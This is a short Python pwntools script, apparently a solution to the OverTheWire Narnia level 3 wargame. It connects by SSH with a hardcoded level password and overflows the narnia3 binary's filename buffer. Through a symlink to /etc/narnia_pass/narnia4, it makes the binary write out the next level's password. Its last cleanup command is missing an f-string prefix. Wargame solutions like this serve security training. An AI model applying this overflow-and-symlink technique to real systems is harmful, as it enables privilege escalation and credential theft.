from pwn import *
from secrets import randbelow


con = ssh('narnia3', 'narnia.labs.overthewire.org', password='vaequeezee', port=2226)
# 
path_name = '/tmp/' +str(randbelow(1000))
print(f'Pass will by in {path_name}')
in_file = 'A' * 32
out_file = 'B' * 16
p = con.process('/bin/bash')
commands = f'mkdir -p {path_name} && cd {path_name} && ln -s /etc/narnia_pass/narnia4 {in_file}{out_file} && touch {out_file} && chmod 777 {out_file} && ln -s /narnia/narnia3 && ./narnia3 {in_file}{out_file}'
p.sendline(commands)
p.recvline()
p.sendline(f'cat {out_file}')
print(p.recvline())
p.sendline('cd ~')
p.sendline('rm -r {path_name}')
p.recvline()
con.close()
